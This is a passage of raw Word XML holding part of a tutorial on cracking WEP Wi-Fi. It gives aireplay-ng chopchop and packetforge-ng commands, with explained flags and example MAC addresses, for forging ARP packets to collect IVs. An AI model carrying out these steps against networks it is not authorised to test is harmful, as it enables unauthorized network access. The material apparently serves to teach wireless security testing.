          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Do Chop </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A202A3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Chop</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A202A3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> against WEP A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r w:rsidRPr="00A202A3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12205080" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRPr="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A202A3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>CHOPCHOP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CBCF1D3" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRPr="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00A202A3">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00A202A3">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A202A3">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -4 -h 00:09:5B:EC:EE:F2 -b 00:14:6C:7E:40:80 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A263AD2" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67AB6194" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>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-4 means the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>chopchop</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34CB5C0F" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>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00:09:5B:EC:EE:F2 is the MAC address of our card and must match the MAC used in the fake authentication</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78977780" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>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b</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65D05159" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>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Pr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the wireless interface name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A112109" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27C1E075" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRPr="00216592" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00216592">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Success! The file “fragment-0203-180343.xor” can then be used in the next step to generate an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00216592">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00216592">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BEA54BE" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRPr="00216592" w:rsidRDefault="00A202A3">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E2D0A33" w14:textId="458048D1" w:rsidR="00A202A3" w:rsidRPr="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A202A3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A202A3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>packetforge-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A202A3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to create an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A202A3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A202A3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40ED00C9" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">In the previous step, we obtained PRGA. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>It does not matter which attack generated the PRGA</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>both are equal</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>. This PRGA is stored in the files ending with “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>xor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">”. We can then use this PRGA to generate a packet for injection. We will be generating an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet for injection. The objective is to have the access point rebroadcast the injected </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet. When it rebroadcasts it, a new IV is obtained. All these new IVs will ultimately be used to crack the WEP key.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F43EE54" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">But first, lets generate the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet for injection by entering:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C1B03CD" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="436DAFE8" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRPr="008E353E" w:rsidRDefault="00A202A3" w:rsidP="007A2085">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>packetforge</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -0 -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 -k 255.255.255.255 -l 255.255.255.255 -y fragment-0203-180343.xor -w </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6202285A" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07D2F312" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="007A2085">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42C39C02" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">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-0 means generate an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6544C17B" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">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a</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19BF73D6" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">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00:09:5B:EC:EE:F2 is MAC address of our card</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60CB9EA6" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">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k</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 255.255.255.255 is the destination IP (most APs respond to 255.255.255.255)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E923233" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">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l</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 255.255.255.255 is the source IP (most APs respond to 255.255.255.255)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="499CBDF2" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">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y</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> fragment-0203-180343.xor is file to read the PRGA from (NOTE: Change the file name to the actual file name out in step 4 above)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D2FCAA7" w14:textId="77777777" w:rsidR="00A202A3" w:rsidRDefault="00A202A3" w:rsidP="00A202A3">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w</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">-request is name of file to write the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68A4CB5D" w14:textId="03CDBA3F" w:rsidR="00A202A3" w:rsidRDefault="00A202A3">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="066EC07B" w14:textId="3556501D" w:rsidR="00A202A3" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
